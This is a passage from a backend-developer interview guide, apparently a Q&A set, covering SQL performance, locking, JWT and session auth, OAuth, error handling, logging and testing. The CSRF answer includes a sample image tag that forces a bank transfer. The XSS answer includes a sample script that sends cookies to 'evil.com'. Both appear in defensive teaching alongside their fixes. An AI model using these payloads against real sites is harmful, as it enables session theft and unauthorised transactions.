```sql
-- ❌ Dangerous: rename column directly (breaks running app)
ALTER TABLE users RENAME COLUMN email TO email_address;

-- ✅ Safe: expand-contract pattern
-- Step 1 (deploy migration): add new column
ALTER TABLE users ADD COLUMN email_address VARCHAR(255);

-- Step 2 (deploy code): write to BOTH columns, read from old
-- Step 3 (backfill): UPDATE users SET email_address = email;

-- Step 4 (deploy code): read from new column only
-- Step 5 (deploy migration): drop old column
ALTER TABLE users DROP COLUMN email;
```

> 📖 Reference: [DB Migrations — Prisma Docs](https://www.prisma.io/dataguide/types/relational/what-are-database-migrations)

---

**Q21. What is connection pooling? Why do backends use it instead of opening a new DB connection per request?**

**Answer:**

Opening a database connection is expensive: it involves TCP handshake, authentication, and SSL negotiation — taking 20–100ms each time. For an API handling 1000 requests/second, creating a new connection per request is catastrophic.

**Connection pooling** maintains a pool of pre-established connections that are reused across requests.

```
Without pooling:
Request 1 → Connect (50ms) → Query (5ms) → Disconnect → Total: 55ms
Request 2 → Connect (50ms) → Query (5ms) → Disconnect → Total: 55ms
...

With pooling:
Startup → Create 10 connections (one-time cost)
Request 1 → Borrow connection → Query (5ms) → Return → Total: 5ms
Request 2 → Borrow connection → Query (5ms) → Return → Total: 5ms
```

**Code Example (Node.js with pg pool):**

```js
const { Pool } = require('pg');

// ✅ Create pool once at startup
const pool = new Pool({
  host:     process.env.DB_HOST,
  database: process.env.DB_NAME,
  user:     process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  max:      20,              // max 20 simultaneous connections
  idleTimeoutMillis: 30000,  // close idle connections after 30s
  connectionTimeoutMillis: 2000, // fail if no connection available in 2s
});

// Each request borrows a connection from the pool
app.get('/users', async (req, res) => {
  const client = await pool.connect(); // borrow
  try {
    const result = await client.query('SELECT * FROM users');
    res.json(result.rows);
  } finally {
    client.release(); // ← CRITICAL: always return to pool
  }
});

// Or use pool.query() which handles borrow/release automatically
app.get('/users', async (req, res) => {
  const result = await pool.query('SELECT * FROM users');
  res.json(result.rows);
});
```

> 📖 Reference: [Connection Pooling — PgBouncer Docs](https://www.pgbouncer.org/features.html)

---

**Q22. What is the difference between optimistic locking and pessimistic locking?**

**Answer:**

Both prevent two concurrent operations from corrupting data, but they use different strategies.

**Pessimistic Locking:** Assume conflicts WILL happen. Lock the row before reading it.

```sql
-- Lock the row for the duration of the transaction
BEGIN;
SELECT * FROM products WHERE id = 1 FOR UPDATE; -- row is now LOCKED
-- Other transactions trying to lock this row will WAIT

UPDATE products SET stock = stock - 1 WHERE id = 1;
COMMIT; -- lock released
```

**Optimistic Locking:** Assume conflicts are RARE. Read freely, but check before writing.

```sql
-- Products table has a 'version' column
-- Read: version = 5, stock = 10
SELECT id, stock, version FROM products WHERE id = 1;

-- Write: only update if version hasn't changed
UPDATE products
SET stock = stock - 1, version = version + 1
WHERE id = 1 AND version = 5; -- ← check version

-- If another transaction updated it first, version is now 6
-- affectedRows = 0 → conflict! Retry the operation.
```

**Example in code:**

```js
async function purchaseItem(productId, userId) {
  for (let attempt = 0; attempt < 3; attempt++) {
    const product = await db.query(
      'SELECT id, stock, version FROM products WHERE id = ?', [productId]
    );

    if (product.stock === 0) throw new Error('Out of stock');

    const result = await db.query(
      'UPDATE products SET stock = stock - 1, version = version + 1 WHERE id = ? AND version = ?',
      [productId, product.version]
    );

    if (result.affectedRows === 1) {
      return await createOrder(userId, productId); // ✅ success
    }
    // affectedRows = 0 means conflict → retry
  }
  throw new Error('Too many conflicts, try again');
}
```

| | Pessimistic | Optimistic |
|--|------------|-----------|
| Strategy | Lock before read | Check version on write |
| Best for | High contention (many conflicts expected) | Low contention (conflicts rare) |
| Performance | Slower (waiting for locks) | Faster (no waiting) |
| Risk | Deadlocks | Retry storms under high contention |

> 📖 Reference: [Optimistic vs Pessimistic Locking — Vlad Mihalcea](https://vladmihalcea.com/optimistic-vs-pessimistic-locking/)

---

**Q23. How do you write an efficient SQL query? What are common performance pitfalls?**

**Answer:**

```sql
-- ❌ PITFALL 1: SELECT * fetches unnecessary columns (more I/O, more memory)
SELECT * FROM users;
-- ✅ Fetch only what you need
SELECT id, name, email FROM users;

-- ❌ PITFALL 2: Function on indexed column — defeats the index
SELECT * FROM orders WHERE YEAR(created_at) = 2024;
-- ✅ Use range instead
SELECT * FROM orders WHERE created_at >= '2024-01-01' AND created_at < '2025-01-01';

-- ❌ PITFALL 3: Leading wildcard LIKE — can't use index
SELECT * FROM users WHERE name LIKE '%alice%';
-- ✅ Trailing wildcard can use index, or use full-text search
SELECT * FROM users WHERE name LIKE 'alice%';

-- ❌ PITFALL 4: OR on different columns — can miss index
SELECT * FROM users WHERE email = 'a@b.com' OR phone = '123';
-- ✅ Use UNION instead
SELECT * FROM users WHERE email = 'a@b.com'
UNION
SELECT * FROM users WHERE phone = '123';

-- ❌ PITFALL 5: NOT IN with NULLs — unexpected behavior
SELECT * FROM users WHERE id NOT IN (SELECT user_id FROM banned);
-- ✅ Use NOT EXISTS or LEFT JOIN
SELECT u.* FROM users u
LEFT JOIN banned b ON u.id = b.user_id
WHERE b.user_id IS NULL;

-- ❌ PITFALL 6: No LIMIT on large table scans
SELECT * FROM logs WHERE level = 'error'; -- could return millions of rows!
-- ✅ Always paginate
SELECT * FROM logs WHERE level = 'error' ORDER BY created_at DESC LIMIT 100;

-- ❌ PITFALL 7: Implicit type conversion breaks index
-- users.id is INT, but:
SELECT * FROM users WHERE id = '42'; -- string → int conversion
-- ✅ Match types
SELECT * FROM users WHERE id = 42;
```

> 📖 Reference: [SQL Optimization — Use The Index Luke](https://use-the-index-luke.com/)

---

**Q24. What is `EXPLAIN` / `EXPLAIN ANALYZE` in SQL? How do you use it?**

**Answer:**

`EXPLAIN` shows the **query execution plan** — how the database will execute a query (which indexes it uses, estimated cost). `EXPLAIN ANALYZE` actually runs the query and shows real timing data.

```sql
-- EXPLAIN: shows plan without running the query
EXPLAIN
SELECT u.name, COUNT(o.id) as order_count
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
WHERE u.created_at > '2024-01-01'
GROUP BY u.id;

-- Output:
-- Hash Aggregate (cost=245.00..247.50 rows=250)
--   ->  Hash Left Join (cost=112.50..232.50 rows=2500)
--         Hash Cond: (o.user_id = u.id)
--         ->  Seq Scan on orders  (cost=0..85.00 rows=5000)   ← full scan!
--         ->  Hash
--               ->  Seq Scan on users   (cost=0..22.50 rows=250)
--                     Filter: (created_at > '2024-01-01')

-- EXPLAIN ANALYZE: runs the query and shows actual vs estimated time
EXPLAIN ANALYZE
SELECT * FROM users WHERE email = 'alice@example.com';

-- Output:
-- Index Scan using idx_users_email on users  (cost=0.29..8.31 rows=1)
--                                             (actual time=0.045..0.046 rows=1)
--   Index Cond: (email = 'alice@example.com')
-- Planning Time: 0.1 ms
-- Execution Time: 0.08 ms  ← fast! index is used ✅
```

**Key things to look for:**

| Bad sign | What it means | Fix |
|----------|--------------|-----|
| `Seq Scan` on large table | Full table scan — no index used | Add an index |
| `cost=` very high number | Expensive operation | Rewrite query or add index |
| Estimated rows very wrong | Stale statistics | Run `ANALYZE table_name` |
| `Hash Join` on huge tables | Memory pressure | Add index to join column |

> 📖 Reference: [EXPLAIN — PostgreSQL Docs](https://www.postgresql.org/docs/current/sql-explain.html)

---

**Q25. What is denormalization? When is it a valid choice?**

**Answer:**

**Denormalization** intentionally introduces redundancy into a database schema to improve read performance — trading write complexity and storage for query speed.

```sql
-- ✅ Normalized (3NF): no redundancy, but JOIN required for every read
-- users table: id, name, email
-- orders table: id, user_id, total
-- order_items table: id, order_id, product_id, quantity, price
-- products table: id, name, category

-- To show "Alice's last order with items" needs 4-table JOIN

-- ✅ Denormalized: store user_name directly on the order
-- orders table: id, user_id, user_name, total, item_count
-- Reads are instant — no JOIN needed
```

**Real-world denormalization example:**

```sql
-- ❌ Normalized: counting orders per user requires JOIN every time
SELECT u.name, COUNT(o.id) as order_count
FROM users u LEFT JOIN orders o ON u.id = o.user_id
GROUP BY u.id; -- expensive at scale

-- ✅ Denormalized: store order_count directly on users table
ALTER TABLE users ADD COLUMN order_count INT DEFAULT 0;

-- Update it when an order is created (trigger or application code)
UPDATE users SET order_count = order_count + 1 WHERE id = :userId;

-- Now the read is instant:
SELECT name, order_count FROM users; -- no JOIN!
```

**When denormalization is valid:**
- Read-heavy workloads (dashboards, reports, public APIs).
- The JOIN is always needed and very expensive.
- The denormalized field changes infrequently.
- Write consistency is managed carefully (triggers, events, background jobs).

**When to avoid it:**
- Write-heavy workloads — keeping redundant data in sync is expensive.
- The data changes frequently — risk of inconsistency.

> 📖 Reference: [Denormalization — GeeksForGeeks](https://www.geeksforgeeks.org/denormalization-in-databases/)

---

## 4. Authentication & Sessions

---

**Q26. What is the difference between cookie-based sessions and token-based authentication (JWT)?**

**Answer:**

**Cookie-based sessions:**

```
1. User logs in → server creates a session, stores it in DB/Redis
2. Server sends back a session ID cookie: Set-Cookie: sessionId=abc123
3. Browser automatically attaches cookie on every request
4. Server looks up session in DB for every request
```

**JWT token-based:**

```
1. User logs in → server creates and signs a JWT with user data
2. Server sends JWT to client (in response body or cookie)
3. Client stores JWT (localStorage or cookie) and sends it in Authorization header
4. Server verifies JWT signature — no DB lookup needed
```

| | Cookie Sessions | JWT |
|--|----------------|-----|
| State stored | Server (DB/Redis) | Client (inside token) |
| Revocation | Easy — delete session | Hard — token valid until expiry |
| Scalability | Requires shared session store | Stateless — any server can verify |
| Size | Small (just an ID) | Larger (all claims in token) |
| Best for | Traditional web apps | Microservices, mobile, SPAs |

```js
// ✅ Cookie session (Express + express-session)
app.post('/login', async (req, res) => {
  const user = await validateCredentials(req.body);
  req.session.userId = user.id;  // stored server-side
  res.json({ message: 'Logged in' });
});

app.get('/profile', (req, res) => {
  if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
  // DB lookup for session
});

// ✅ JWT (stateless)
app.post('/login', async (req, res) => {
  const user = await validateCredentials(req.body);
  const token = jwt.sign(
    { userId: user.id, role: user.role }, // payload
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );
  res.json({ token });
});

app.get('/profile', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  const payload = jwt.verify(token, process.env.JWT_SECRET); // no DB lookup
  res.json({ userId: payload.userId });
});
```

> 📖 Reference: [Session vs Token Auth — Auth0](https://auth0.com/docs/get-started/identity-fundamentals/authentication-and-authorization)

---

**Q27. What is a JWT? What are its three parts? What are its pros and cons?**

**Answer:**

A **JWT (JSON Web Token)** is a compact, URL-safe token that contains claims (data) and is cryptographically signed.

**Structure:** `header.payload.signature` — each part is base64url-encoded.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.    ← Header
eyJ1c2VySWQiOjQyLCJyb2xlIjoiYWRtaW4ifQ.   ← Payload
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature
```

**Decoded:**

```json
// Header
{ "alg": "HS256", "typ": "JWT" }

// Payload (claims — NOT encrypted, just base64-encoded!)
{
  "userId": 42,
  "role": "admin",
  "iat": 1716000000,   // issued at
  "exp": 1716003600    // expires at (1 hour later)
}

// Signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret)
// Verifies the token wasn't tampered with
```

```js
const jwt = require('jsonwebtoken');

// Sign
const token = jwt.sign(
  { userId: 42, role: 'admin' },
  process.env.JWT_SECRET,
  { expiresIn: '15m' }
);

// Verify
try {
  const payload = jwt.verify(token, process.env.JWT_SECRET);
  console.log(payload.userId); // 42
} catch (err) {
  // TokenExpiredError or JsonWebTokenError
  console.error('Invalid token:', err.message);
}
```

**Pros and Cons:**

| Pros | Cons |
|------|------|
| Stateless — no DB lookup | Cannot be revoked before expiry |
| Works across microservices | Payload visible (don't put secrets in it) |
| Carries claims (no extra DB call) | If secret leaks, all tokens compromised |
| Standard — many libraries | Size larger than session cookie |

> 📖 Reference: [JWT Introduction — jwt.io](https://jwt.io/introduction)

---

**Q28. What is the difference between access tokens and refresh tokens?**

**Answer:**

| | Access Token | Refresh Token |
|--|-------------|--------------|
| Purpose | Authenticate API requests | Obtain a new access token |
| Lifespan | Short (5–30 minutes) | Long (7–90 days) |
| Storage | Memory or short-lived cookie | HttpOnly cookie or secure storage |
| Sent to | Every API request | Only to `/auth/refresh` endpoint |
| If compromised | Attacker has access for minutes | Attacker can generate tokens indefinitely |

**Flow:**

```
1. Login → Server issues access token (15min) + refresh token (30 days)
2. Client uses access token for API calls
3. Access token expires → Client sends refresh token to /auth/refresh
4. Server validates refresh token → issues new access token
5. If refresh token expires → User must log in again
```

```js
// Issuing both tokens on login
app.post('/login', async (req, res) => {
  const user = await validateCredentials(req.body);

  const accessToken = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_ACCESS_SECRET,
    { expiresIn: '15m' }
  );

  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '30d' }
  );

  // Store refresh token hash in DB so it can be revoked
  await db.query(
    'INSERT INTO refresh_tokens (user_id, token_hash) VALUES (?, ?)',
    [user.id, hashToken(refreshToken)]
  );

  // Access token in response body, refresh token in HttpOnly cookie
  res.cookie('refreshToken', refreshToken, { httpOnly: true, secure: true });
  res.json({ accessToken });
});

// Refreshing the access token
app.post('/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });

  try {
    const payload = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);

    // Check it's in the DB (not revoked)
    const stored = await db.query(
      'SELECT * FROM refresh_tokens WHERE user_id = ? AND token_hash = ?',
      [payload.userId, hashToken(refreshToken)]
    );
    if (!stored) return res.status(401).json({ error: 'Token revoked' });

    const newAccessToken = jwt.sign(
      { userId: payload.userId },
      process.env.JWT_ACCESS_SECRET,
      { expiresIn: '15m' }
    );
    res.json({ accessToken: newAccessToken });
  } catch {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

> 📖 Reference: [Access vs Refresh Tokens — Auth0](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/)

---

**Q29. What is bcrypt? Why should you never store plain-text passwords?**

**Answer:**

**Why never store plain-text passwords:**
- If your database is breached, all users' passwords are immediately exposed.
- Users reuse passwords — attackers gain access to their other accounts too.
- It violates basic security principles and most compliance standards (GDPR, PCI-DSS).

**bcrypt** is a password hashing function designed to be **slow** (deliberately) to prevent brute-force attacks. It automatically handles salting (adding random data before hashing to prevent rainbow table attacks).

```js
const bcrypt = require('bcryptjs');

// ✅ Hashing a password at registration
app.post('/register', async (req, res) => {
  const { email, password } = req.body;

  const saltRounds = 12; // work factor — higher = slower = more secure
  // At 12 rounds: ~300ms to hash — too slow for brute force, fine for login
  const hashedPassword = await bcrypt.hash(password, saltRounds);

  await db.query(
    'INSERT INTO users (email, password_hash) VALUES (?, ?)',
    [email, hashedPassword]
  );
  // Stored: "$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/DP..."
  // Original password is gone forever — even you can't recover it ✅

  res.status(201).json({ message: 'Account created' });
});

// ✅ Verifying a password at login
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  const user = await db.query('SELECT * FROM users WHERE email = ?', [email]);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  // bcrypt re-hashes the input with the same salt and compares
  const isValid = await bcrypt.compare(password, user.password_hash);
  if (!isValid) return res.status(401).json({ error: 'Invalid credentials' });

  // ✅ Note: always return the same error for wrong email OR wrong password
  // "Invalid credentials" — not "User not found" (prevents user enumeration)

  const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET);
  res.json({ token });
});
```

**Why bcrypt vs SHA-256:**
- SHA-256 is designed to be **fast** — attackers can compute billions per second.
- bcrypt is designed to be **slow** — limits brute force to a few hundred per second.

> 📖 Reference: [Password Hashing — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

---

**Q30. What is OAuth 2.0 at a high level? Name its major grant types.**

**Answer:**

**OAuth 2.0** is an authorization framework that allows third-party applications to access a user's resources without the user sharing their password. Think "Login with Google" or "Connect your GitHub account."

**The 4 roles:**
- **Resource Owner** — the user
- **Client** — the third-party app requesting access
- **Authorization Server** — issues tokens (e.g., Google's auth server)
- **Resource Server** — the API holding the user's data (e.g., Google APIs)

**Major Grant Types:**

| Grant Type | Use Case | Example |
|-----------|---------|---------|
| **Authorization Code** | Web apps with backend | "Login with Google" on a website |
| **Authorization Code + PKCE** | Mobile/SPA apps | "Login with Google" in a React app |
| **Client Credentials** | Server-to-server (no user) | Your backend calling another API |
| **Device Code** | Smart TVs, CLI tools | "Visit this URL to authorize" |
| ~~Implicit~~ | ~~Deprecated~~ | Use PKCE instead |

**Authorization Code Flow (most common):**

```
User                     Your App                  Google Auth          Google API
 │                           │                           │                   │
 │── Click "Login Google" ──►│                           │                   │
 │                           │── Redirect to Google ────►│                   │
 │◄── Google Login Page ─────────────────────────────────│                   │
 │── Enters credentials ─────────────────────────────────►│                   │
 │◄── Redirect with ?code=xyz ──────────────────────────────────────────────│
 │                           │◄── code=xyz ──────────────│                   │
 │                           │── POST /token (code) ─────►│                   │
 │                           │◄── access_token ───────────│                   │
 │                           │────────────────────────────────── GET /profile ►│
 │                           │◄──────────────────────────────── user data ─────│
 │◄── You are logged in! ────│                           │                   │
```

> 📖 Reference: [OAuth 2.0 — Aaron Parecki](https://www.oauth.com/)

---

**Q31. What is CSRF (Cross-Site Request Forgery)? How do you prevent it?**

**Answer:**

**CSRF** tricks a logged-in user's browser into making an unwanted request to a trusted site — using the victim's cookies automatically attached by the browser.

**Attack example:**

```html
<!-- Evil site: attacker.com sends this to victim -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000" />
<!-- Browser automatically attaches victim's bank cookies! -->
<!-- Bank processes this as a legitimate request from the user 😱 -->
```

**Prevention strategies:**

```js
// ✅ Method 1: CSRF tokens (synchronizer token pattern)
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
  // Token embedded in the form: <input name="_csrf" value="...token...">
});

app.post('/transfer', (req, res) => {
  // csurf middleware automatically validates the token
  // If missing or wrong → 403 Forbidden
});

// ✅ Method 2: SameSite cookie attribute (modern, simple)
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'Strict'  // cookie NOT sent on cross-site requests ✅
});

// ✅ Method 3: Check Origin/Referer header in API
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  if (origin && !origin.startsWith('https://yourapp.com')) {
    return res.status(403).json({ error: 'CSRF check failed' });
  }
  next();
});

// ✅ Method 4: JWT in Authorization header (not cookies)
// Browsers don't auto-attach Authorization headers on cross-site requests
// So XHR/fetch-based SPAs using JWTs in headers are naturally CSRF-safe
```

> 📖 Reference: [CSRF — OWASP](https://owasp.org/www-community/attacks/csrf)

---

**Q32. What is XSS (Cross-Site Scripting)? How does it relate to backend APIs?**

**Answer:**

**XSS** is an attack where malicious JavaScript is injected into a web page and executed in other users' browsers — stealing cookies, tokens, or performing actions on their behalf.

**How it relates to backend APIs:**

```js
// ❌ Stored XSS: backend saves raw user input and returns it
app.post('/comments', async (req, res) => {
  await db.query('INSERT INTO comments (body) VALUES (?)', [req.body.body]);
  // Attacker submits: "<script>fetch('evil.com?c='+document.cookie)</script>"
  // Everyone who views this comment gets their cookies stolen
});

app.get('/comments', async (req, res) => {
  const comments = await db.query('SELECT * FROM comments');
  res.json(comments); // Returns the malicious script as-is 😱
});

// ✅ Fix 1: Sanitize input before storing (using DOMPurify on server or sanitize-html)
const sanitizeHtml = require('sanitize-html');

app.post('/comments', async (req, res) => {
  const clean = sanitizeHtml(req.body.body, {
    allowedTags: ['b', 'i', 'em', 'strong'], // whitelist only safe tags
    allowedAttributes: {}
  });
  await db.query('INSERT INTO comments (body) VALUES (?)', [clean]);
});

// ✅ Fix 2: Set Content-Security-Policy header
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; object-src 'none'"
  );
  next();
});
// This tells the browser: only run scripts from our own domain

// ✅ Fix 3: HttpOnly cookies so JS can't read them
res.cookie('sessionId', token, { httpOnly: true }); // XSS can't steal it
```

**Key types:**
- **Stored XSS:** Malicious script saved in DB, served to all users.
- **Reflected XSS:** Script injected via URL parameter, executed immediately.
- **DOM XSS:** Client-side code writes unescaped data to the DOM.

> 📖 Reference: [XSS — OWASP](https://owasp.org/www-community/attacks/xss/)

---

## 5. Error Handling & Logging

---

**Q33. What is the difference between operational errors and programmer errors in a backend?**

**Answer:**

| | Operational Error | Programmer Error |
|--|------------------|-----------------|
| Definition | Expected runtime failures — the system is working correctly, but something external went wrong | Bugs in the code — unexpected states the developer didn't handle |
| Examples | DB connection timeout, 404 not found, invalid user input, API rate limit | `TypeError: Cannot read property of undefined`, infinite loop, wrong SQL query |
| How to handle | Catch, return proper HTTP response, log, retry if needed | Fix the bug. Do not try to recover — crash and restart |
| Should crash app? | ❌ No | ✅ Yes (in production, let the process manager restart) |

```js
// ✅ Operational error — handle gracefully
app.get('/users/:id', async (req, res, next) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' }); // operational ✅
    res.json(user);
  } catch (err) {
    if (err.code === 'ECONNREFUSED') {
      return res.status(503).json({ error: 'Database unavailable' }); // operational ✅
    }
    next(err); // programmer error — let global handler deal with it
  }
});

// ✅ Programmer error — let the process crash and restart
process.on('uncaughtException', (err) => {
  logger.error('Uncaught exception — shutting down', err);
  process.exit(1); // Let PM2 or Kubernetes restart the process
});
```

> 📖 Reference: [Error Handling — Joyent Node.js Guide](https://www.joyent.com/node-js/production/design/errors)

---

**Q34. How should a REST API return errors? What is a good error response structure?**

**Answer:**

```js
// ❌ BAD error responses
res.status(200).json({ success: false, msg: 'Something went wrong' });
// Wrong: 200 status for an error!

res.status(500).json('User not found');
// Wrong: using 500 for a client error, plain string body

// ✅ GOOD: consistent, machine-readable error structure
const errorResponse = (res, statusCode, code, message, details = null) => {
  return res.status(statusCode).json({
    error: {
      code,        // machine-readable error code for the client to switch on
      message,     // human-readable explanation
      details,     // optional: field-level validation errors
      requestId:   res.locals.requestId, // for tracing in logs
      timestamp:   new Date().toISOString()
    }
  });
};

// Usage examples:
app.post('/users', validate(schema), async (req, res) => {
  const existing = await User.findByEmail(req.body.email);
  if (existing) {
    return errorResponse(res, 409, 'EMAIL_ALREADY_EXISTS',
      'A user with this email already exists');
  }

  const user = await User.create(req.body);
  res.status(201).json({ data: user });
});

// Validation error (from middleware):
// HTTP 400
// {
//   "error": {
//     "code": "VALIDATION_ERROR",
//     "message": "Request validation failed",
//     "details": [
//       { "field": "email", "message": "Invalid email format" },
//       { "field": "age",   "message": "Must be at least 13" }
//     ],
//     "requestId": "req-abc-123",
//     "timestamp": "2024-06-01T12:00:00.000Z"
//   }
// }
```

> 📖 Reference: [API Error Handling — Microsoft REST Guidelines](https://github.com/microsoft/api-guidelines/blob/vNext/azure/Guidelines.md#handling-errors)

---

**Q35. What is a global error handler in Express? Why is it important?**

**Answer:**

A global error handler catches any unhandled error thrown in route handlers or middleware — preventing crashes and ensuring consistent error responses.

```js
// ❌ Without global error handler: errors bubble up and crash the process
app.get('/users/:id', async (req, res) => {
  const user = await User.findById(req.params.id); // throws if DB is down
  // If this throws and there's no try/catch, Express returns a 500 with HTML 😱
});

// ✅ Global error handler — place LAST, after all routes
app.use((err, req, res, next) => {
  // Log the full error for debugging
  logger.error({
    message: err.message,
    stack:   err.stack,
    url:     req.url,
    method:  req.method,
    requestId: req.id
  });

  // Known operational errors
  if (err.name === 'ValidationError') {
    return res.status(400).json({ error: { code: 'VALIDATION_ERROR', message: err.message }});
  }
  if (err.name === 'UnauthorizedError') {
    return res.status(401).json({ error: { code: 'UNAUTHORIZED', message: 'Invalid token' }});
  }
  if (err.code === 'P2025') { // Prisma: record not found
    return res.status(404).json({ error: { code: 'NOT_FOUND', message: 'Resource not found' }});
  }

  // Unknown programmer error — don't leak internal details
  res.status(500).json({
    error: {
      code: 'INTERNAL_SERVER_ERROR',
      message: 'An unexpected error occurred',
      requestId: req.id
    }
  });
  // Note: never expose err.stack in production responses!
});

// ✅ Async error wrapper — automatically passes errors to global handler
const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

app.get('/users/:id', asyncHandler(async (req, res) => {
  const user = await User.findById(req.params.id); // any throw goes to global handler
  res.json(user);
}));
```

> 📖 Reference: [Express Error Handling — Express Docs](https://expressjs.com/en/guide/error-handling.html)

---

**Q36. What is structured logging? What is the difference between `console.log` and a proper logger?**

**Answer:**

**Structured logging** outputs logs as machine-readable JSON objects instead of plain strings, enabling powerful filtering, searching, and alerting in log management tools.

```js
// ❌ console.log — unstructured, hard to query in production
console.log('User 42 placed order 99 for $150 at 2024-06-01T12:00:00');
// In Datadog/Splunk: can only text-search this string. Can't filter by userId.

// ✅ Structured logging with Winston
const winston = require('winston');

const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()   // ← outputs JSON
  ),
  transports: [
    new winston.transports.Console(),
    new winston.transports.File({ filename: 'app.log' })
  ]
});

// Usage:
logger.info('Order placed', {
  userId:  42,
  orderId: 99,
  amount:  150,
  currency: 'USD',
  requestId: req.id
});

// Output (JSON):
// {
//   "level": "info",
//   "message": "Order placed",
//   "userId": 42,
//   "orderId": 99,
//   "amount": 150,
//   "currency": "USD",
//   "requestId": "req-abc-123",
//   "timestamp": "2024-06-01T12:00:00.123Z"
// }
// Now you can query: level=info AND userId=42 AND amount>100
```

| | `console.log` | Structured Logger |
|--|-------------|-----------------|
| Output format | Plain string | JSON |
| Log levels | None | debug/info/warn/error |
| Searchable fields | No | Yes |
| Production use | ❌ | ✅ |
| Performance | Poor (synchronous) | Better (async, buffered) |

> 📖 Reference: [Structured Logging — Better Stack](https://betterstack.com/community/guides/logging/structured-logging/)

---

**Q37. What log levels exist (debug, info, warn, error)? When do you use each?**

**Answer:**

| Level | Priority | When to use | Example |
|-------|---------|------------|---------|
| **debug** | Lowest | Detailed diagnostic info — only in development | SQL queries, function entry/exit, variable values |
| **info** | Normal | Normal application events worth recording | User logged in, order created, cache hit/miss |
| **warn** | Medium | Something unexpected but recoverable | Deprecated API used, retrying failed request, slow query |
| **error** | High | A failure that needs attention | Unhandled exception, payment failed, DB connection lost |
| **fatal/critical** | Highest | System is about to crash | Out of memory, cannot connect to DB at startup |

```js
const logger = require('./logger');

app.post('/orders', async (req, res) => {
  logger.debug('Order request received', { body: req.body }); // dev only

  const user = await User.findById(req.body.userId);
  if (!user) {
    logger.warn('Order attempted for non-existent user', { userId: req.body.userId });
    return res.status(404).json({ error: 'User not found' });
  }

  try {
    const order = await Order.create(req.body);
    logger.info('Order created successfully', { orderId: order.id, userId: user.id }); // ✅ record event
    res.status(201).json(order);
  } catch (err) {
    logger.error('Failed to create order', {  // ✅ needs attention
      error: err.message,
      stack: err.stack,
      userId: req.body.userId
    });
    res.status(500).json({ error: 'Order creation failed' });
  }
});
```

**In production:** Set `LOG_LEVEL=info` — debug logs are too verbose and slow. In development: `LOG_LEVEL=debug`.

> 📖 Reference: [Log Levels — Sematext](https://sematext.com/blog/logging-levels/)

---

## 6. Testing Basics

---

**Q38. What is the difference between unit tests, integration tests, and end-to-end tests?**

**Answer:**

```
Testing Pyramid:

        /\
       /  \    E2E Tests (few, slow, expensive)
      /────\   "Does the whole app work?"
     /      \
    /────────\  Integration Tests (moderate)
   /          \ "Do components work together?"
  /────────────\
 /              \ Unit Tests (many, fast, cheap)
/────────────────\ "Does each function work in isolation?"
```

**Unit Tests:** Test a single function or class in complete isolation. All dependencies are mocked.

```js
// Testing a pure function — no DB, no HTTP, no filesystem
const { calculateDiscount } = require('./pricing');

describe('calculateDiscount', () => {
  it('applies 10% for orders over $100', () => {
    expect(calculateDiscount(150, 'NEWUSER')).toBe(15);
  });

  it('returns 0 discount for orders under $100', () => {
    expect(calculateDiscount(50, 'NEWUSER')).toBe(0);
  });
});
```

**Integration Tests:** Test how multiple components work together. May use a real DB (test instance) or test HTTP endpoints.

```js
// Testing the API layer with a real database
describe('POST /users', () => {
  beforeAll(async () => { await db.migrate.latest(); });
  afterEach(async () => { await db.raw('TRUNCATE TABLE users'); });

  it('creates a user and returns 201', async () => {
    const res = await request(app)
      .post('/users')
      .send({ name: 'Alice', email: 'alice@test.com', password: 'pass123' });

    expect(res.status).toBe(201);
    expect(res.body.data.email).toBe('alice@test.com');
    // Verify it's actually in the DB
    const user = await db('users').where({ email: 'alice@test.com' }).first();
    expect(user).toBeDefined();
  });
});
```

**End-to-End Tests:** Drive the full system like a real user — browser, real backend, real database.

```js
// Playwright E2E test
test('user can register and place an order', async ({ page }) => {
  await page.goto('https://staging.myapp.com');
  await page.fill('[name="email"]', 'test@example.com');
  await page.fill('[name="password"]', 'password123');
  await page.click('button[type="submit"]');
  await expect(page).toHaveURL('/dashboard');
});
```

| | Unit | Integration | E2E |
|--|------|-------------|-----|
| Speed | Fast (ms) | Medium (seconds) | Slow (minutes) |
| Isolation | Complete | Partial | None |
| Confidence | Low (isolated) | Medium | High (real system) |
| Maintenance | Low | Medium | High |

> 📖 Reference: [Testing Pyramid — Martin Fowler](https://martinfowler.com/articles/practical-test-pyramid.html)

---

**Q39. What is Test-Driven Development (TDD)? What are its benefits and drawbacks?**

**Answer:**

**TDD** is a development cycle where you write the test **before** the implementation:

```
Red → Green → Refactor

1. RED:    Write a failing test for the feature you're about to build
2. GREEN:  Write the minimum code to make the test pass
